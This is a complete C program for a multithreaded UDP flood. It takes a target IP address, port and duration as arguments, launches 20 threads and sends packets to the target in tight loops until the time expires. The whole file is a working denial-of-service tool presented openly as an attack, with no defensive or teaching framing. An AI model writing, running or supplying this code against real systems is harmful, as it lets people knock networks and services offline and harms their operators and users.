#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

// Structure to hold attack data for each thread
struct thread_data {
    char *target_ip;
    int target_port;
    int attack_duration;
};

// Function to handle the UDP attack for each thread
void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    // Create a UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->target_port);
    server_addr.sin_addr.s_addr = inet_addr(data->target_ip);

    endtime = time(NULL) + data->attack_duration;
    char *payload = "UDP flood packet";

    // Send packets until attack duration expires
    while (time(NULL) <= endtime) {
        ssize_t sent_bytes = sendto(sock, payload, strlen(payload), 0, (const struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent_bytes < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <target_ip> <target_port> <attack_duration>\n", argv[0]);
        return 1;
    }

    // Parse command-line arguments
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int attack_duration = atoi(argv[3]);
    int threads = 20;  // Limit to 20 threads

    // Allocate memory for thread IDs
    pthread_t thread_ids[threads];
    struct thread_data data = {target_ip, target_port, attack_duration};

    // Create 20 threads to launch the attack
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
    }

    // Wait for all threads to finish
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    printf("Attack completed.\n");
    return 0;
}
